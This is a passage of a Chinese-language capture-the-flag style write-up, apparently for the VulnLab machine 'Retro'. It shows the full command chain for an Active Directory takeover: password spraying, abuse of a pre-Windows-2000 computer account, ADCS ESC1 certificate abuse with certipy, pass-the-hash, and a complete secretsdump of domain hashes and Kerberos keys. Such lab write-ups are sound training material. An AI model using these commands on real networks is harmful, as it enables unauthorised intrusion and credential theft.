+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> Important.txt</span><br><span class="line">Dear Trainees,</span><br><span class="line"></span><br><span class="line">I know that some of you seemed to struggle with remembering strong and unique passwords.</span><br><span class="line">So we decided to bundle every one of you up into one account.</span><br><span class="line">Stop bothering us. Please. We have other stuff to <span class="keyword">do</span> than resetting your password every day.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line"></span><br><span class="line">The Admins   </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>親愛的學員們</p>
+<p>我知道你們當中有些人似乎很難記住強而獨特的密碼。<br>因此，我們決定將您們每個人捆綁到一個帳戶中。<br>不要再麻煩我們了。拜託了。除了每天重新設定您的密碼之外，我們還有其他事情要做。</p>
+<p>關於</p>
+<p>管理員</p>
+</blockquote>
+<p>由於上面使用 <code>rid-brute</code>​ 獲取了所有用戶的名字：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">trainee</span><br><span class="line">jburley</span><br><span class="line">HelpDesk</span><br><span class="line">tblack</span><br></pre></td></tr></table></figure>
+
+<p>所以嘗試密碼噴射看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap  10.10.85.6 -u user.txt -p user.txt --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102064719-6ovrjgc.png" alt="image">​</p>
+<p>看到 <code>trainee</code>​ 的用戶密碼是 <code>trainee</code>​，既然有一個有效的賬號密碼就順便看一下 smb 共享：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb  10.10.85.6 -u trainee -p <span class="string">&#x27;trainee&#x27;</span> --shares</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102065534-fwpuz3r.png" alt="image">​</p>
+<p>結果發現多了一個 <code>Notes</code>​ 的共享目錄，所以進去看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -U <span class="string">&quot;trainee%trainee&quot;</span> <span class="string">&quot;//10.10.85.6/Notes&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102065617-sey8jqd.png" alt="image">​</p>
+<p>看到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Thomas,</span><br><span class="line"></span><br><span class="line">after convincing the finance department to get rid of their ancienct banking software</span><br><span class="line">it is finally time to clean up the mess they made. We should start with the pre created</span><br><span class="line">computer account. That one is older than me.</span><br><span class="line"></span><br><span class="line">Best</span><br><span class="line"></span><br><span class="line">James                                                                                                                                                                                                            </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>湯瑪士</p>
+<p>在說服財務部門擺脫他們舊有的銀行軟體之後<br>現在終於到了清理他們造成的爛攤子的時候了。我們應該從預先建立的<br>電腦帳戶。那個帳戶比我還老。</p>
+<p>最好的</p>
+<p>詹姆斯</p>
+</blockquote>
+<p>其實這段話就暗示著 <code>Pre-Windows 2000 computers</code>​，從<a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers">這篇文章</a>中透露：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250103012332-cyrx5yg.png" alt="image">​</p>
+<p>需要從 ldap 中找到一些電腦被設置成 <code>userAccountControl=4128</code>​ 這個屬性，所以：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H ldap://10.10.85.6 -x -D <span class="string">&#x27;retro\trainee&#x27;</span> -w <span class="string">&#x27;trainee&#x27;</span> -b <span class="string">&quot;DC=retro,DC=vl&quot;</span> <span class="string">&quot;(userAccountControl=4128)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102070235-whaehhl.png" alt="image">​</p>
+<p>看到有一個 <code>banking</code>​ 的計算機，被設置成<code>Pre-Windows 2000 computers</code>​ 的電腦密碼就是計算機的名字：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb  10.10.85.6 -u banking$ -p <span class="string">&#x27;banking&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102070307-kdgl1h9.png" alt="image">​</p>
+<p>從上面的結果中可以看到，如果使用 ntlm 是會顯示 <code>NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>​，既然 NTLM 驗證失敗了，那就可以嘗試 <code>kerberos</code>​ 驗證：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap  10.10.85.6 -u banking$ -p <span class="string">&#x27;banking&#x27;</span>  -k</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102070413-tgg7qqg.png" alt="image">​</p>
+<h1 id="Enum-ADCS-and-exploit-ESC1-to-get-admin-ntlm-hash"><a href="#Enum-ADCS-and-exploit-ESC1-to-get-admin-ntlm-hash" class="headerlink" title="Enum ADCS and exploit ESC1 to get admin ntlm hash"></a>Enum ADCS and exploit ESC1 to get admin ntlm hash</h1><p>發現 <code>kerberos</code>​ 驗證沒有問題，而且也發現了 adcs ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap  10.10.85.6 -u banking$ -p <span class="string">&#x27;banking&#x27;</span> -M adcs -k</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102070535-i2iicyr.png" alt="image">​</p>
+<p>所以請求一個 ticket ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ getTGT.py <span class="string">&#x27;retro.vl/banking$:banking&#x27;</span>@dc.retro.vl -dc-ip 10.10.85.6</span><br><span class="line">$ getTGT.py <span class="string">&#x27;retro.vl/banking$&#x27;</span>@dc.retro.vl -dc-ip 10.10.85.6</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102071518-6yibc7g.png" alt="image">​</p>
+<p>然後交給 certipy 找一下有沒有可利用的證書：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> KRB5CCNAME=banking\<span class="variable">$@dc</span>.retro.vl.ccache</span><br><span class="line">$ certipy-ad find -u <span class="string">&#x27;banking$@retro.vl&#x27;</span>  -k -no-pass -debug -ns 10.10.85.6 -dns-tcp</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072005-ml34iyu.png" alt="image">​</p>
+<p>結果發現一堆錯誤，由於緩存服務器的關係，<code>certipy</code>​ 沒辦法找到正確的 DC IP，所以需要配合 <code>-dc-ip</code>​ 和 <code>-target</code>​ 這兩個屬性：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ certipy-ad find -u <span class="string">&#x27;banking$@retro.vl&#x27;</span>  -k -no-pass -debug -ns 10.10.85.6 -dns-tcp  -dc-ip 10.10.85.6 -target dc.retro.vl</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072143-4jzpwwk.png" alt="image">​</p>
+<p>找到了之後，<code>certipy</code>​ 一般會自動標記可以利用的證書，所以搜索一下 <code>ESC</code>​ ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072211-wxr5qzm.png" alt="image">​</p>
+<p>​<code>certipy</code>​標記了可以使用 ESC1 來達到管理員，具體可以參考 <a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#misconfigured-certificate-templates---esc1">Hacktricks </a>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ certipy-ad req -u <span class="string">&#x27;banking$@retro.vl&#x27;</span>  -k -no-pass -debug -ns 10.10.85.6 -dns-tcp  -dc-ip 10.10.85.6 -target dc.retro.vl -ca <span class="string">&#x27;retro-DC-CA&#x27;</span>  -template <span class="string">&#x27;RetroClients&#x27;</span> -upn <span class="string">&#x27;administrator@RETRO.VL&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072509-5vndelm.png" alt="image">​</p>
+<p>但是請求了之後會提示 key 的長度太小了，使用 <code>-key-size 4096</code>​ 設置一下就好了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ certipy-ad req -u <span class="string">&#x27;banking$@retro.vl&#x27;</span>  -k -no-pass -debug -ns 10.10.85.6 -dns-tcp  -dc-ip 10.10.85.6 -target dc.retro.vl -ca <span class="string">&#x27;retro-DC-CA&#x27;</span>  -template <span class="string">&#x27;RetroClients&#x27;</span> -upn <span class="string">&#x27;administrator@RETRO.VL&#x27;</span> -key-size 4096</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072607-zctop9h.png" alt="image">​</p>
+<p>然後得到 <code>administrator</code>​ 的證書，稍微 <code>auth</code>​ 就得到了 ntlm hash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ certipy-ad auth -pfx administrator.pfx -debug -ns 10.10.85.6 -dns-tcp  -dc-ip 10.10.85.6</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072752-o7tmzqm.png" alt="image">​</p>
+<p>直接 pass the hash 就可以得到管理員了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.85.6 -u administrator -H <span class="string">&quot;252fac7066d93dd009d4fd2cd0368389&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072826-2l77s0v.png" alt="image">​</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">??$ secretsdump.py administrator@10.10.85.6 -hashes <span class="string">&quot;:252fac7066d93dd009d4fd2cd0368389&quot;</span></span><br><span class="line">Impacket v0.13.0.dev0+20241127.154729.af51dfd - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xd5c69b965ec7d89a8d5762c2846bcb0c</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)</span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets</span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC</span></span><br><span class="line"><span class="string">RETRO\DC$:aes256-cts-hmac-sha1-96:207796698e3d98b2d47c356fb41fc86cd8119fd0af41958a033a9e5ab42f8b84</span></span><br><span class="line"><span class="string">RETRO\DC$:aes128-cts-hmac-sha1-96:22762159f56566a2497ddcc833630439</span></span><br><span class="line"><span class="string">RETRO\DC$:des-cbc-md5:a8c1bc13b96b0175</span></span><br><span class="line"><span class="string">RETRO\DC$:plain_password_hex:c2336ae7d2b146290e57041aad5e90bcc29c3b50cf021a2a17d3835991a296003c142b5ce9642d14a40b16cfbe2323a05c55abf16345d872283203c440d5ddf26e0ba1347ff313248d5789ea2e95bb46c45945d4ad0f5a51d83aea2da22cfa496fb38d775fc0b7c49e8d68b0eef6d9e0c5859ad6cbbc83af84cfe09d41e1bd6387033c21f9fcd39ffb5980eb530b0600ac914720c2c0913108a8e2afcbdc5c7164bf22668390d724cc92f48f41726a1b09aa647ff7f1f7e2d3cdbf7c7397f8c8ba7e2a22f0d61b28db05be092bc753e9f55778df95da642b663bb34ceffb85f7f960d6697f1eae8eed5917fd767bd069</span></span><br><span class="line"><span class="string">RETRO\DC$:aad3b435b51404eeaad3b435b51404ee:de2e7c5b486af7261f1a3ce606dea1aa:::</span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM</span></span><br><span class="line"><span class="string">dpapi_machinekey:0x1a91aeabc5e9e6ee791b7bc2e9561cea87ef7894</span></span><br><span class="line"><span class="string">dpapi_userkey:0x41514bfd3fd38746c223d69c962f4d98716c8fdc</span></span><br><span class="line"><span class="string">[*] NL$KM</span></span><br><span class="line"><span class="string"> 0000   22 79 68 4A 15 1B F7 0F  2F B0 11 73 81 EA 70 8A   &quot;yhJ..../..s..p.</span></span><br><span class="line"><span class="string"> 0010   04 FC 30 D1 D1 DE A1 30  BC FA 5D CE 83 0A 43 12   ..0....0..]...C.</span></span><br><span class="line"><span class="string"> 0020   97 33 54 4B DA 4D FE 47  B1 8C 87 C1 72 22 E9 36   .3TK.M.G....r&quot;.6</span></span><br><span class="line"><span class="string"> 0030   8E 8D 4C 1E 3E F6 C8 00  A1 23 9F 3A D5 0A 41 B0   ..L.&gt;....#.:..A.</span></span><br><span class="line"><span class="string">NL$KM:2279684a151bf70f2fb0117381ea708a04fc30d1d1dea130bcfa5dce830a43129733544bda4dfe47b18c87c17222e9368e8d4c1e3ef6c800a1239f3ad50a41b0</span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e11fffd0ed83eedde12611fc2fbb8650:::</span></span><br><span class="line"><span class="string">retro.vl\trainee:1104:aad3b435b51404eeaad3b435b51404ee:2a217a32bde94a23b26a8eea26c70874:::</span></span><br><span class="line"><span class="string">retro.vl\jburley:1107:aad3b435b51404eeaad3b435b51404ee:38a7c1cf54d326ae1198a25067318b10:::</span></span><br><span class="line"><span class="string">retro.vl\tblack:1109:aad3b435b51404eeaad3b435b51404ee:0adf9f3819565a0d0f3890290ecc3919:::</span></span><br><span class="line"><span class="string">DC$:1000:aad3b435b51404eeaad3b435b51404ee:de2e7c5b486af7261f1a3ce606dea1aa:::</span></span><br><span class="line"><span class="string">BANKING$:1106:aad3b435b51404eeaad3b435b51404ee:2ea2019d5d1f4ffa75f411818935b333:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys grabbed</span></span><br><span class="line"><span class="string">Administrator:aes256-cts-hmac-sha1-96:91aedadb959890d0c47c73a0f462bcb9775c52de2147520748517f091d016aec</span></span><br><span class="line"><span class="string">Administrator:aes128-cts-hmac-sha1-96:dc12711ef29dce1e858846241c62d6b8</span></span><br><span class="line"><span class="string">Administrator:des-cbc-md5:62d575800229e991</span></span><br><span class="line"><span class="string">krbtgt:aes256-cts-hmac-sha1-96:7dc8d6308f224bda9f408203848a87ba7cc483299e8af1089295bfafdf9091b4</span></span><br><span class="line"><span class="string">krbtgt:aes128-cts-hmac-sha1-96:e08f92a73b979e18cd92bfd01384d17f</span></span><br><span class="line"><span class="string">krbtgt:des-cbc-md5:04f8ba042a0d0b34</span></span><br><span class="line"><span class="string">retro.vl\trainee:aes256-cts-hmac-sha1-96:e462ff9c3e807665fb64fb8d3d04bfb5ca82e10374c7f68c03dfaa4d8fd754de</span></span><br><span class="line"><span class="string">retro.vl\trainee:aes128-cts-hmac-sha1-96:48d6b2f2502bb0b6c6079b5d4f566e62</span></span><br><span class="line"><span class="string">retro.vl\trainee:des-cbc-md5:529d4ae0cbcea249</span></span><br><span class="line"><span class="string">retro.vl\jburley:aes256-cts-hmac-sha1-96:931a7941a2eccb21a44b8882dbe7fe55eb3d1af71eed3281f340d49307f538f6</span></span><br><span class="line"><span class="string">retro.vl\jburley:aes128-cts-hmac-sha1-96:297f2b94f22d44a3f5279d942e8503a0</span></span><br><span class="line"><span class="string">retro.vl\jburley:des-cbc-md5:ef4fb9451f64eada</span></span><br><span class="line"><span class="string">retro.vl\tblack:aes256-cts-hmac-sha1-96:186354f19e5a23e4a6f2a6726d91e834327cf5f673bc8581f4df0fd65919ecf3</span></span><br><span class="line"><span class="string">retro.vl\tblack:aes128-cts-hmac-sha1-96:dec95a15b87f9b91e23d24e5b232eda4</span></span><br><span class="line"><span class="string">retro.vl\tblack:des-cbc-md5:2cf23101436bda4f</span></span><br><span class="line"><span class="string">DC$:aes256-cts-hmac-sha1-96:207796698e3d98b2d47c356fb41fc86cd8119fd0af41958a033a9e5ab42f8b84</span></span><br><span class="line"><span class="string">DC$:aes128-cts-hmac-sha1-96:22762159f56566a2497ddcc833630439</span></span><br><span class="line"><span class="string">DC$:des-cbc-md5:ce6d26c154832a34</span></span><br><span class="line"><span class="string">BANKING$:aes256-cts-hmac-sha1-96:d215e09b025ab8e91abe7a570969decaf49efc85de2077b4f1101469763d771f</span></span><br><span class="line"><span class="string">BANKING$:aes128-cts-hmac-sha1-96:03b78767fef16b7514728db0ffbd2379</span></span><br><span class="line"><span class="string">BANKING$:des-cbc-md5:13e545d332ce802f</span></span><br><span class="line"><span class="string">[*] Cleaning up...</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&text=VulnLab - Machine - Retro"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&is_video=false&description=VulnLab - Machine - Retro"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Retro&body=Check out this article: https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&name=VulnLab - Machine - Retro&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&t=VulnLab - Machine - Retro"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
